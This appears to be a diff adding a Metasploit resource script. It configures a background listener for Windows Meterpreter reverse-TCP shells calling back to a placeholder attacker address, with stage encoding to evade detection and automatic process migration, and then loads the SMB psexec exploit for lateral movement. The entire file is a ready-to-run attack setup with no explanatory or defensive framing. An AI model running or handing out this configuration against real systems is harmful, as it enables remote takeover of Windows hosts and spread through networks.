@@ -1,0 +1,10 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost X.X.X.X
+set lport YYY
+set exitonsession false
+set enablestageencoding true
+set autorunscript migrate -f
+jobs -K
+exploit -j -z
+use exploit/windows/smb/psexec
